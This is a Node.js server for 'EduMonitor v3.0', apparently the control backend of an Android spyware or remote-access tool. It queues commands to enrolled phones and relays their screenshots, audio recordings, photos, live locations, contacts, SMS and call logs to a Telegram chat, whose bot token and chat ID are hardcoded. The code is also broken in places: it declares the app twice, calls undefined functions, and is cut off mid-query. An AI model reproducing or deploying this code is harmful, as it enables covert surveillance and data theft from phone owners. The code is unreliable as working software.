const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
const schedule = require('node-schedule');
const geoip = require('geoip-lite');
const sharp = require('sharp');
const ffmpeg = require('fluent-ffmpeg');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const compression = require('compression');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

// ✅ FIX: Create app FIRST, THEN set trust proxy
const app = express();
const server = http.createServer(app);

// ✅ Now set trust proxy (after app is created)
app.set('trust proxy', 1); // Trust first proxy

// ============================================
// CONFIGURATION
// ============================================
const config = {
    telegram: {
        token: process.env.TELEGRAM_BOT_TOKEN || '8655508141:AAH7ziEjGbwnAKur944BomeVvQ6nrt7jzqw',
        chatId: process.env.TELEGRAM_CHAT_ID || '5326373447'
    },
    server: {
        port: process.env.PORT || 8999,
        wsPort: process.env.WS_PORT || 9000,
        host: process.env.HOST || '0.0.0.0'
    },
    security: {
        encryptionKey: process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
        jwtSecret: process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex'),
        rateLimit: 100,
        sessionTimeout: 30 * 60 * 1000 // 30 minutes
    },
    storage: {
        maxFileSize: 100 * 1024 * 1024, // 100MB
        retentionDays: 7
    }
};
// ============================================
// DATABASE SETUP
// ============================================
const db = new sqlite3.Database('./edumonitor.db');

db.serialize(() => {
    // Devices table
    db.run(`CREATE TABLE IF NOT EXISTS devices (
        id TEXT PRIMARY KEY,
        name TEXT,
        model TEXT,
        android_version TEXT,
        manufacturer TEXT,
        chat_id TEXT,
        registered_at INTEGER,
        last_seen INTEGER,
        battery_level INTEGER,
        is_active INTEGER DEFAULT 1,
        encryption_key TEXT,
        features TEXT
    )`);

    // Commands table
    db.run(`CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        device_id TEXT,
        command TEXT,
        parameters TEXT,
        status TEXT,
        created_at INTEGER,
        executed_at INTEGER,
        result TEXT,
        priority INTEGER DEFAULT 0,
        FOREIGN KEY(device_id) REFERENCES devices(id)
    )`);

    // Locations table
    db.run(`CREATE TABLE IF NOT EXISTS locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        latitude REAL,
        longitude REAL,
        accuracy REAL,
        altitude REAL,
        speed REAL,
        provider TEXT,
        timestamp INTEGER,
        geofence_trigger TEXT,
        FOREIGN KEY(device_id) REFERENCES devices(id)
    )`);

    // Media table
    db.run(`CREATE TABLE IF NOT EXISTS media (
        id TEXT PRIMARY KEY,
        device_id TEXT,
        type TEXT,
        file_path TEXT,
        thumbnail_path TEXT,
        size INTEGER,
        timestamp INTEGER,
        metadata TEXT,
        uploaded INTEGER DEFAULT 0,
        FOREIGN KEY(device_id) REFERENCES devices(id)
    )`);

    // Events table
    db.run(`CREATE TABLE IF NOT EXISTS events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        event_type TEXT,
        event_data TEXT,
        severity TEXT,
        timestamp INTEGER,
        acknowledged INTEGER DEFAULT 0,
        FOREIGN KEY(device_id) REFERENCES devices(id)
    )`);

    // Geofences table
    db.run(`CREATE TABLE IF NOT EXISTS geofences (
        id TEXT PRIMARY KEY,
        device_id TEXT,
        name TEXT,
        latitude REAL,
        longitude REAL,
        radius INTEGER,
        trigger_on_enter INTEGER DEFAULT 1,
        trigger_on_exit INTEGER DEFAULT 1,
        actions TEXT,
        FOREIGN KEY(device_id) REFERENCES devices(id)
    )`);

    // Plugins table
    db.run(`CREATE TABLE IF NOT EXISTS plugins (
        id TEXT PRIMARY KEY,
        name TEXT,
        version TEXT,
        enabled INTEGER DEFAULT 1,
        config TEXT,
        installed_at INTEGER
    )`);
});

// ============================================
// EXPRESS SETUP WITH SECURITY
// ============================================
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ 
    server, 
    path: '/ws',
    clientTracking: true,
    perMessageDeflate: true
});

// Security middleware
app.use(helmet());
app.use(compression());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: config.security.rateLimit,
    message: 'Too many requests from this IP'
});
app.use('/api/', limiter);

// ============================================
// ENCRYPTION UTILITIES
// ============================================
const encryption = {
    encrypt(text, key = config.security.encryptionKey) {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-gcm', Buffer.from(key, 'hex'), iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag();
        return {
            iv: iv.toString('hex'),
            encrypted,
            authTag: authTag.toString('hex')
        };
    },

    decrypt(encryptedData, key = config.security.encryptionKey) {
        const decipher = crypto.createDecipheriv(
            'aes-256-gcm',
            Buffer.from(key, 'hex'),
            Buffer.from(encryptedData.iv, 'hex')
        );
        decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));
        let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    },

    generateDeviceKey() {
        return crypto.randomBytes(32).toString('hex');
    }
};

// ============================================
// WEBSOCKET SERVER WITH AUTO-RECONNECT
// ============================================
class DeviceManager {
    constructor() {
        this.devices = new Map();
        this.wsConnections = new Map();
        this.commandQueue = new Map();
        this.eventHandlers = new Map();
    }

    registerDevice(deviceId, ws, deviceInfo) {
        const deviceKey = encryption.generateDeviceKey();
        
        const device = {
            id: deviceId,
            ws,
            info: deviceInfo,
            registeredAt: Date.now(),
            lastSeen: Date.now(),
            key: deviceKey,
            features: deviceInfo.features || [],
            batteryLevel: deviceInfo.battery,
            commands: [],
            pendingCommands: []
        };

        this.devices.set(deviceId, device);
        this.wsConnections.set(ws, deviceId);

        // Store in database
        db.run(`INSERT OR REPLACE INTO devices 
            (id, name, model, android_version, manufacturer, chat_id, registered_at, last_seen, battery_level, encryption_key, features) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [
                deviceId,
                deviceInfo.name || 'Unknown',
                deviceInfo.model,
                deviceInfo.androidVersion,
                deviceInfo.manufacturer,
                deviceInfo.chatId,
                Date.now(),
                Date.now(),
                deviceInfo.battery,
                deviceKey,
                JSON.stringify(deviceInfo.features || [])
            ]
        );

        this.emit('device_connected', device);
        return device;
    }

    updateDevice(deviceId, data) {
        const device = this.devices.get(deviceId);
        if (device) {
            Object.assign(device, data);
            device.lastSeen = Date.now();
            
            db.run(`UPDATE devices SET 
                last_seen = ?, 
                battery_level = ?,
                features = ?
                WHERE id = ?`,
                [Date.now(), data.batteryLevel, JSON.stringify(data.features || []), deviceId]
            );
        }
    }

    sendCommand(deviceId, command, parameters = {}, priority = 0) {
        const device = this.devices.get(deviceId);
        if (!device) return false;

        const commandId = uuidv4();
        const cmd = {
            id: commandId,
            command,
            parameters,
            priority,
            timestamp: Date.now()
        };

        // Encrypt for WebSocket
        const encrypted = encryption.encrypt(JSON.stringify(cmd), device.key);

        try {
            if (device.ws && device.ws.readyState === WebSocket.OPEN) {
                device.ws.send(JSON.stringify({
                    type: 'command',
                    id: commandId,
                    data: encrypted
                }));
                
                db.run(`INSERT INTO commands (id, device_id, command, parameters, status, created_at, priority)
                    VALUES (?, ?, ?, ?, 'sent', ?, ?)`,
                    [commandId, deviceId, command, JSON.stringify(parameters), Date.now(), priority]
                );
                
                return true;
            } else {
                // Queue for later
                device.pendingCommands.push(cmd);
                return 'queued';
            }
        } catch (error) {
            console.error(`Error sending command to ${deviceId}:`, error);
            return false;
        }
    }

    broadcastToDevices(message, filter = null) {
        this.devices.forEach((device, deviceId) => {
            if (filter && !filter(device)) return;
            if (device.ws && device.ws.readyState === WebSocket.OPEN) {
                device.ws.send(JSON.stringify(message));
            }
        });
    }

    on(event, handler) {
        if (!this.eventHandlers.has(event)) {
            this.eventHandlers.set(event, []);
        }
        this.eventHandlers.get(event).push(handler);
    }

    emit(event, data) {
        const handlers = this.eventHandlers.get(event) || [];
        handlers.forEach(handler => handler(data));
    }

    disconnectDevice(deviceId) {
        const device = this.devices.get(deviceId);
        if (device) {
            if (device.ws) {
                device.ws.close();
                this.wsConnections.delete(device.ws);
            }
            this.devices.delete(deviceId);
            
            db.run(`UPDATE devices SET is_active = 0 WHERE id = ?`, [deviceId]);
            this.emit('device_disconnected', device);
        }
    }
}

const deviceManager = new DeviceManager();

// WebSocket connection handling
wss.on('connection', (ws, req) => {
    const deviceId = req.headers['device-id'];
    const deviceKey = req.headers['device-key'];
    const deviceInfo = JSON.parse(req.headers['device-info'] || '{}');

    if (!deviceId) {
        ws.close(1008, 'Device ID required');
        return;
    }

    // Authenticate device
    db.get('SELECT encryption_key FROM devices WHERE id = ?', [deviceId], (err, row) => {
        if (err || !row) {
            // New device registration
            const device = deviceManager.registerDevice(deviceId, ws, deviceInfo);
            
            ws.send(JSON.stringify({
                type: 'registered',
                deviceId: device.id,
                key: device.key,
                timestamp: Date.now()
            }));
        } else {
            // Existing device - verify key
            if (deviceKey !== row.encryption_key) {
                ws.close(1008, 'Invalid device key');
                return;
            }
            
            const device = deviceManager.registerDevice(deviceId, ws, deviceInfo);
            device.key = row.encryption_key;
        }

        // Send any pending commands
        db.all('SELECT * FROM commands WHERE device_id = ? AND status = "sent" ORDER BY priority DESC, created_at ASC',
            [deviceId], (err, commands) => {
                commands.forEach(cmd => {
                    const encrypted = encryption.encrypt(JSON.stringify({
                        command: cmd.command,
                        parameters: JSON.parse(cmd.parameters)
                    }), deviceManager.devices.get(deviceId).key);
                    
                    ws.send(JSON.stringify({
                        type: 'command',
                        id: cmd.id,
                        data: encrypted
                    }));
                });
            }
        );
    });

    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            
            switch (message.type) {
                case 'pong':
                    deviceManager.updateDevice(deviceId, { lastSeen: Date.now() });
                    break;

                case 'response':
                    await handleDeviceResponse(deviceId, message);
                    break;

                case 'location':
                    await handleDeviceLocation(deviceId, message.data);
                    break;

                case 'media':
                    await handleDeviceMedia(deviceId, message);
                    break;

                case 'event':
                    await handleDeviceEvent(deviceId, message);
                    break;

                case 'battery':
                    deviceManager.updateDevice(deviceId, { batteryLevel: message.level });
                    break;

                case 'log':
                    console.log(`[${deviceId}] ${message.message}`);
                    break;
            }
        } catch (error) {
            console.error('Error processing message:', error);
        }
    });

    ws.on('close', () => {
        deviceManager.disconnectDevice(deviceId);
    });

    // Send initial ping
    ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
});

// ============================================
// RESPONSE HANDLERS
// ============================================
async function handleDeviceResponse(deviceId, message) {
    const device = deviceManager.devices.get(deviceId);
    if (!device) return;

    // Update command status
    db.run(`UPDATE commands SET status = ?, result = ?, executed_at = ? WHERE id = ?`,
        [message.success ? 'completed' : 'failed', JSON.stringify(message.data), Date.now(), message.commandId]
    );

    // Forward to Telegram if needed
    if (message.forwardToChat) {
        await sendTelegramMessage(device.info.chatId, formatResponse(message));
    }

    // Handle specific response types
    if (message.data && message.data.type === 'screenshot') {
        await handleScreenshotResponse(deviceId, message.data);
    } else if (message.data && message.data.type === 'recording') {
        await handleRecordingResponse(deviceId, message.data);
    }
}

async function handleDeviceLocation(deviceId, locationData) {
    const device = deviceManager.devices.get(deviceId);
    
    // Store location
    db.run(`INSERT INTO locations 
        (device_id, latitude, longitude, accuracy, altitude, speed, provider, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        [
            deviceId,
            locationData.lat,
            locationData.lon,
            locationData.accuracy,
            locationData.altitude || 0,
            locationData.speed || 0,
            locationData.provider,
            locationData.timestamp
        ]
    );

    // Check geofences
    checkGeofences(deviceId, locationData);

    // Real-time tracking if enabled
    if (device && device.tracking) {
        await sendTelegramLocation(device.info.chatId, locationData.lat, locationData.lon);
    }
}

async function handleDeviceMedia(deviceId, message) {
    const { mediaId, type, metadata } = message;
    
    db.run(`UPDATE media SET uploaded = 1, metadata = ? WHERE id = ?`,
        [JSON.stringify(metadata), mediaId]
    );

    // Generate thumbnail for images
    if (type.startsWith('image/')) {
        const media = await getMediaById(mediaId);
        if (media) {
            const thumbnailPath = await generateThumbnail(media.file_path);
            db.run(`UPDATE media SET thumbnail_path = ? WHERE id = ?`, [thumbnailPath, mediaId]);
        }
    }
}

async function handleDeviceEvent(deviceId, message) {
    const { event, data, severity } = message;
    
    db.run(`INSERT INTO events (device_id, event_type, event_data, severity, timestamp)
        VALUES (?, ?, ?, ?, ?)`,
        [deviceId, event, JSON.stringify(data), severity || 'info', Date.now()]
    );

    // Forward critical events to Telegram
    if (severity === 'critical' || severity === 'warning') {
        const device = deviceManager.devices.get(deviceId);
        await sendTelegramMessage(device.info.chatId, 
            `⚠️ *${severity.toUpperCase()}* on ${device.info.model}\n\n${event}: ${JSON.stringify(data)}`
        );
    }
}

// ============================================
// TELEGRAM BOT INTEGRATION
// ============================================
const TELEGRAM_API = `https://api.telegram.org/bot${config.telegram.token}`;

async function sendTelegramMessage(chatId, text, options = {}) {
    try {
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            ...options
        });
        return response.data;
    } catch (error) {
        console.error('Telegram send error:', error.response?.data || error.message);
        return null;
    }
}

async function sendTelegramLocation(chatId, lat, lon, accuracy = 0) {
    try {
        await axios.post(`${TELEGRAM_API}/sendLocation`, {
            chat_id: chatId,
            latitude: lat,
            longitude: lon,
            horizontal_accuracy: accuracy
        });
    } catch (error) {
        console.error('Location send error:', error);
    }
}

async function sendTelegramPhoto(chatId, photoPath, caption = '') {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', fs.createReadStream(photoPath));
        formData.append('caption', caption);

        await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
            headers: formData.getHeaders()
        });
    } catch (error) {
        console.error('Photo send error:', error);
    }
}

async function sendTelegramDocument(chatId, filePath, filename, caption = '') {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);

        await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: formData.getHeaders()
        });
    } catch (error) {
        console.error('Document send error:', error);
    }
}

// ============================================
// ADVANCED FEATURES
// ============================================

// Geofencing
async function checkGeofences(deviceId, location) {
    db.all('SELECT * FROM geofences WHERE device_id = ? OR device_id IS NULL', [deviceId], (err, fences) => {
        fences.forEach(fence => {
            const distance = calculateDistance(
                location.lat, location.lon,
                fence.latitude, fence.longitude
            );

            const wasInside = checkIfInside(deviceId, fence.id);
            const isInside = distance <= fence.radius;

            if (!wasInside && isInside && fence.trigger_on_enter) {
                executeGeofenceActions(deviceId, fence, 'enter');
            } else if (wasInside && !isInside && fence.trigger_on_exit) {
                executeGeofenceActions(deviceId, fence, 'exit');
            }

            updateGeofenceState(deviceId, fence.id, isInside);
        });
    });
}

function calculateDistance(lat1, lon1, lat2, lon2) {
    const R = 6371e3; // Earth's radius in meters
    const φ1 = lat1 * Math.PI/180;
    const φ2 = lat2 * Math.PI/180;
    const Δφ = (lat2-lat1) * Math.PI/180;
    const Δλ = (lon2-lon1) * Math.PI/180;

    const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
              Math.cos(φ1) * Math.cos(φ2) *
              Math.sin(Δλ/2) * Math.sin(Δλ/2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));

    return R * c;
}

async function executeGeofenceActions(deviceId, fence, event) {
    const actions = JSON.parse(fence.actions || '[]');
    const device = deviceManager.devices.get(deviceId);

    for (const action of actions) {
        switch (action.type) {
            case 'telegram':
                await sendTelegramMessage(device.info.chatId,
                    `📍 *Geofence ${event}*\n` +
                    `Fence: ${fence.name}\n` +
                    `Device: ${device.info.model}\n` +
                    `Time: ${new Date().toLocaleString()}`
                );
                break;

            case 'command':
                deviceManager.sendCommand(deviceId, action.command, action.parameters);
                break;

            case 'webhook':
                try {
                    await axios.post(action.url, {
                        deviceId,
                        fence: fence.name,
                        event,
                        location: device.lastLocation
                    });
                } catch (error) {
                    console.error('Webhook error:', error);
                }
                break;
        }
    }
}

// Media processing
async function generateThumbnail(imagePath, size = 320) {
    const thumbDir = path.join(__dirname, 'thumbnails');
    if (!fs.existsSync(thumbDir)) fs.mkdirSync(thumbDir);

    const thumbName = `thumb_${path.basename(imagePath)}`;
    const thumbPath = path.join(thumbDir, thumbName);

    await sharp(imagePath)
        .resize(size, size, { fit: 'inside' })
        .jpeg({ quality: 70 })
        .toFile(thumbPath);

    return thumbPath;
}

async function processVideo(videoPath) {
    const outputDir = path.join(__dirname, 'processed');
    if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir);

    const outputName = `compressed_${path.basename(videoPath)}`;
    const outputPath = path.join(outputDir, outputName);

    return new Promise((resolve, reject) => {
        ffmpeg(videoPath)
            .videoCodec('libx264')
            .audioCodec('aac')
            .size('640x?')
            .autopad()
            .outputOptions([
                '-preset fast',
                '-crf 28',
                '-movflags +faststart'
            ])
            .on('end', () => resolve(outputPath))
            .on('error', reject)
            .save(outputPath);
    });
}

// ============================================
// API ENDPOINTS
// ============================================

// Device registration (HTTP fallback)
app.post('/api/register', async (req, res) => {
    const { deviceId, chatId, deviceInfo } = req.body;

    if (!deviceId || !chatId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }

    const deviceKey = encryption.generateDeviceKey();

    db.run(`INSERT OR REPLACE INTO devices 
        (id, model, android_version, manufacturer, chat_id, registered_at, last_seen, battery_level, encryption_key, features)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        [
            deviceId,
            deviceInfo.model,
            deviceInfo.android,
            deviceInfo.manufacturer,
            chatId,
            Date.now(),
            Date.now(),
            deviceInfo.battery,
            deviceKey,
            JSON.stringify(deviceInfo.features || [])
        ]
    );

    res.json({
        status: 'registered',
        deviceId,
        key: deviceKey,
        serverTime: Date.now(),
        features: ['websocket', 'geofencing', 'plugins', 'encryption']
    });
});

// Command polling (fallback for non-WebSocket devices)
app.get('/api/commands/:deviceId', (req, res) => {
    const { deviceId } = req.params;

    db.all(`SELECT * FROM commands 
        WHERE device_id = ? AND status = 'sent' 
        ORDER BY priority DESC, created_at ASC 
        LIMIT 10`,
        [deviceId],
        (err, commands) => {
            if (err) {
                res.status(500).json({ error: err.message });
            } else {
                // Mark commands as delivered
                commands.forEach(cmd => {
                    db.run(`UPDATE commands SET status = 'delivered' WHERE id = ?`, [cmd.id]);
                });

                res.json({ commands });
            }
        }
    );
});

// Command result
app.post('/api/result/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    const { commandId, result, error } = req.body;

    db.run(`UPDATE commands SET status = ?, result = ?, executed_at = ? WHERE id = ?`,
        [error ? 'failed' : 'completed', JSON.stringify(result || error), Date.now(), commandId]
    );

    // Forward to Telegram if needed
    const device = await getDeviceById(deviceId);
    if (device) {
        await sendTelegramMessage(device.chat_id, 
            error ? `❌ Command failed: ${error}` : `✅ Command executed successfully`
        );
    }

    res.sendStatus(200);
});

// File upload
app.post('/api/upload', multer({ dest: 'uploads/' }).single('file'), async (req, res) => {
    try {
        const { deviceId, type, metadata } = req.body;
        const file = req.file;

        if (!deviceId || !file) {
            return res.status(400).json({ error: 'Missing fields' });
        }

        const mediaId = uuidv4();
        const fileExt = path.extname(file.originalname);
        const newPath = path.join('uploads', `${mediaId}${fileExt}`);

        fs.renameSync(file.path, newPath);

        db.run(`INSERT INTO media (id, device_id, type, file_path, size, timestamp, metadata)
            VALUES (?, ?, ?, ?, ?, ?, ?)`,
            [mediaId, deviceId, type, newPath, file.size, Date.now(), JSON.stringify(metadata)]
        );

        // Generate thumbnail for images
        if (type.startsWith('image/')) {
            const thumbPath = await generateThumbnail(newPath);
            db.run(`UPDATE media SET thumbnail_path = ? WHERE id = ?`, [thumbPath, mediaId]);
        }

        // Forward to Telegram
        const device = await getDeviceById(deviceId);
        if (device) {
            if (type.startsWith('image/')) {
                await sendTelegramPhoto(device.chat_id, newPath, `📸 New ${type} from ${device.model}`);
            } else {
                await sendTelegramDocument(device.chat_id, newPath, file.originalname, 
                    `📎 New ${type} from ${device.model}`);
            }
        }

        res.json({ success: true, mediaId });

    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Location endpoint
app.post('/api/location/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    const locationData = req.body;

    db.run(`INSERT INTO locations 
        (device_id, latitude, longitude, accuracy, altitude, speed, provider, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        [
            deviceId,
            locationData.lat,
            locationData.lon,
            locationData.accuracy,
            locationData.altitude || 0,
            locationData.speed || 0,
            locationData.provider,
            locationData.timestamp
        ]
    );

    // Check geofences
    checkGeofences(deviceId, locationData);

    res.json({ success: true });
});

// Geofence management
app.post('/api/geofence', async (req, res) => {
    const { deviceId, name, latitude, longitude, radius, actions } = req.body;

    const fenceId = uuidv4();

    db.run(`INSERT INTO geofences (id, device_id, name, latitude, longitude, radius, actions)
        VALUES (?, ?, ?, ?, ?, ?, ?)`,
        [fenceId, deviceId, name, latitude, longitude, radius, JSON.stringify(actions)]
    );

    res.json({ success: true, fenceId });
});

app.get('/api/geofences/:deviceId', (req, res) => {
    const { deviceId } = req.params;

    db.all('SELECT * FROM geofences WHERE device_id = ? OR device_id IS NULL', [deviceId], (err, fences) => {
        if (err) {
            res.status(500).json({ error: err.message });
        } else {
            res.json(fences);
        }
    });
});

// Plugin management
app.post('/api/plugin/install', async (req, res) => {
    const { name, version, config } = req.body;

    const pluginId = uuidv4();

    db.run(`INSERT INTO plugins (id, name, version, config, installed_at)
        VALUES (?, ?, ?, ?, ?)`,
        [pluginId, name, version, JSON.stringify(config), Date.now()]
    );

    res.json({ success: true, pluginId });
});

app.get('/api/plugins', (req, res) => {
    db.all('SELECT * FROM plugins WHERE enabled = 1', [], (err, plugins) => {
        res.json(plugins);
    });
});

// Analytics
app.get('/api/analytics/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    const { from, to } = req.query;

    const fromTime = from || Date.now() - 7 * 24 * 60 * 60 * 1000; // 7 days ago
    const toTime = to || Date.now();

    const analytics = {
        commands: await getCommandStats(deviceId, fromTime, toTime),
        locations: await getLocationStats(deviceId, fromTime, toTime),
        media: await getMediaStats(deviceId, fromTime, toTime),
        battery: await getBatteryStats(deviceId, fromTime, toTime),
        events: await getEventStats(deviceId, fromTime, toTime)
    };

    res.json(analytics);
});

// ============================================
// TELEGRAM BOT COMMANDS
// ============================================
app.post('/webhook', async (req, res) => {
    res.sendStatus(200);

    const update = req.body;

    if (update.message) {
        await handleTelegramMessage(update.message);
    } else if (update.callback_query) {
        await handleTelegramCallback(update.callback_query);
    }
});

async function handleTelegramMessage(message) {
    const chatId = message.chat.id;
    const text = message.text;

    if (!text) return;

    // Check authorization
    if (chatId.toString() !== config.telegram.chatId) {
        await sendTelegramMessage(chatId, '⛔ Unauthorized');
        return;
    }

    const args = text.split(' ');
    const command = args[0].toLowerCase();

    switch (command) {
        case '/start':
        case '/help':
            await sendTelegramMessage(chatId, getHelpMessage(), {
                reply_markup: {
                    inline_keyboard: getMainKeyboard()
                }
            });
            break;

        case '/devices':
            await listDevices(chatId);
            break;

        case '/status':
            await getDeviceStatus(chatId, args[1]);
            break;

        case '/screenshot':
            await takeScreenshot(chatId, args[1]);
            break;

        case '/location':
            await getLocation(chatId, args[1]);
            break;

        case '/record':
            await startRecording(chatId, args[1], args[2] || '60');
            break;

        case '/geofence':
            await setupGeofence(chatId, args);
            break;

        case '/track':
            await startTracking(chatId, args[1]);
            break;

        case '/plugins':
            await listPlugins(chatId);
            break;

        case '/analytics':
            await getAnalytics(chatId, args[1]);
            break;

        case '/command':
            await sendCustomCommand(chatId, args.slice(1));
            break;

        default:
            await sendTelegramMessage(chatId, 'Unknown command. Use /help');
    }
}

function getHelpMessage() {
    return `
🤖 *EduMonitor v3.0 - Advanced Control*

*Device Management*
/devices - List all connected devices
/status [id] - Get device status

*Media Commands*
/screenshot [id] - Take screenshot
/record [id] [seconds] - Record audio
/camera [id] [front/rear] - Take photo

*Location & Tracking*
/location [id] - Get current location
/track [id] - Start real-time tracking
/geofence [id] [lat] [lon] [radius] - Set geofence

*Data Extraction*
/contacts [id] - Get contacts
/sms [id] - Get SMS messages
/calllogs [id] - Get call logs
/apps [id] - List installed apps

*Advanced Features*
/plugins - Manage plugins
/analytics [id] - View device analytics
/command [id] [cmd] - Send custom command
/geofences [id] - List geofences

*System*
/help - Show this message
    `;
}

function getMainKeyboard() {
    return [
        [{ text: '📱 Devices', callback_data: 'list_devices' }],
        [{ text: '📍 Track All', callback_data: 'track_all' }],
        [{ text: '📊 Analytics', callback_data: 'show_analytics' }],
        [{ text: '⚙️ Settings', callback_data: 'settings' }]
    ];
}

async function listDevices(chatId) {
    const devices = Array.from(deviceManager.devices.values());
    
    if (devices.length === 0) {
        await sendTelegramMessage(chatId, '📭 No devices connected');
        return;
    }

    let message = '📱 *Connected Devices*\n\n';
    const keyboard = [];

    devices.forEach(device => {
        const batteryEmoji = getBatteryEmoji(device.batteryLevel);
        message += `*${device.info.model}*\n`;
        message += `ID: \`${device.id}\`\n`;
        message += `Battery: ${batteryEmoji} ${device.batteryLevel || '?'}%\n`;
        message += `Last seen: ${new Date(device.lastSeen).toLocaleTimeString()}\n\n`;

        keyboard.push([
            { text: `📸 ${device.info.model}`, callback_data: `device_${device.id}` }
        ]);
    });

    await sendTelegramMessage(chatId, message, {
        reply_markup: { inline_keyboard: keyboard }
    });
}

async function getDeviceStatus(chatId, deviceId) {
    if (!deviceId) {
        await sendTelegramMessage(chatId, 'Usage: /status [device_id]');
        return;
    }

    const device = deviceManager.devices.get(deviceId);
    if (!device) {
        await sendTelegramMessage(chatId, '❌ Device not found');
        return;
    }

    const status = `
📱 *Device Status*
━━━━━━━━━━━━━━━
Model: ${device.info.model}
Android: ${device.info.androidVersion}
Manufacturer: ${device.info.manufacturer}
Battery: ${getBatteryEmoji(device.batteryLevel)} ${device.batteryLevel}%
Uptime: ${formatUptime(device.registeredAt)}
Last Seen: ${new Date(device.lastSeen).toLocaleString()}
Features: ${device.features.join(', ') || 'None'}

*Connection*
Type: WebSocket
Encryption: AES-256-GCM
Queue: ${device.pendingCommands.length} commands

*Storage*
Commands: ${await getCommandCount(deviceId)}
Media: ${await getMediaCount(deviceId)}
Locations: ${await getLocationCount(deviceId)}
    `;

    const keyboard = [
        [
            { text: '📸 Screenshot', callback_data: `screenshot_${deviceId}` },
            { text: '📍 Location', callback_data: `location_${deviceId}` }
        ],
        [
            { text: '🎤 Record', callback_data: `record_${deviceId}` },
            { text: '📊 Analytics', callback_data: `analytics_${deviceId}` }
        ],
        [
            { text: '🔙 Back', callback_data: 'list_devices' }
        ]
    ];

    await sendTelegramMessage(chatId, status, {
        reply_markup: { inline_keyboard: keyboard }
    });
}

// ============================================
// UTILITY FUNCTIONS
// ============================================
function getBatteryEmoji(level) {
    if (!level) return '❓';
    if (level > 80) return '🔋';
    if (level > 50) return '⚡';
    if (level > 20) return '⚠️';
    return '🪫';
}

function formatUptime(timestamp) {
    const seconds = Math.floor((Date.now() - timestamp) / 1000);
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    
    return `${days}d ${hours}h ${minutes}m`;
}

async function getDeviceById(deviceId) {
    return new Promise((resolve, reject) => {
        db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, row) => {
            if (err) reject(err);
            else resolve(row);
        });
    });
}

async function getCommandCount(deviceId) {
    return new Promise((resolve, reject) => {
        db.get('SELECT COUNT(*) as count FROM commands WHERE device_id = ?', [deviceId], (err, row) => {
            if (err) reject(err);
            else resolve(row.count);
        });
    });
}

async function getMediaCount(deviceId) {
    return new Promise((resolve, reject) => {
        db.get('SELECT COUNT(*) as count FROM media WHERE device_id = ?', [deviceId], (err, row) => {
            if (err) reject(err);
            else resolve(row.count);
        });
    });
}

async function getLocationCount(deviceId) {
    return new Promise((resolve, reject) => {
        db.get('SELECT COUNT(*) as count FROM locations WHERE device_id = ?', [deviceId], (err, row) => {
            if (err) reject(err);
            else resolve(row.count);
        });
    });
}

async function getCommandStats(deviceId, from, to) {
    return new Promise((resolve, reject) => {
        db.all(`SELECT status, COUNT(*) as count, 
                AVG(executed_at - created_at) as avg_time
                FROM commands 
                WHERE device_id = ? AND created_at BETWEEN ? AND ?
                GROUP BY status`,
            [deviceId, from, to],
            (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            }
        );
    });
}

async function getLocationStats(deviceId, from, to) {
    return new Promise((resolve, reject) => {
        db.all(`SELECT COUNT(*) as total,
                AVG(accuracy) as avg_accuracy,
                MAX(timestamp) as last_update
                FROM locations 
                WHERE device_id = ? AND timestamp BETWEEN ? AND ?`,
            [deviceId, from, to],
            (err, rows) => {
                if (err) reject(err);
                else resolve(rows[0]);
            }
        );
    });
}

async function getMediaStats(deviceId, from, to) {
    return new Promise((resolve, reject) => {
        db.all(`SELECT type, COUNT(*) as count, 
                SUM(size) as total_size
                FROM media 
                WHERE device_id = ? AND timestamp BETWEEN ? AND ?
                GROUP BY type`,
            [deviceId, from, to],
            (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            }
        );
    });
}

async function getBatteryStats(deviceId, from, to) {
    return new Promise((resolve, reject) => {
        db.all(`SELECT AVG(battery_level) as avg_battery,
                MIN(battery_level) as min_battery,
